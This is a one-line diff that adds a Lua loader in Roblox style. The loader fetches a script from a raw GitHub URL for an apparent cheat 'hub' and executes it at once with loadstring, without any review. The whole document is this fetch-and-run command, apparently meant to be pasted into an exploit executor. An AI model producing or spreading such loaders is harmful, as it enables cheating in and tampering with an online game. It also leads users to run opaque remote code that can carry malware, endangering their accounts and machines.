@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/c4shhh/cash-hubb/main/hubbb"))()
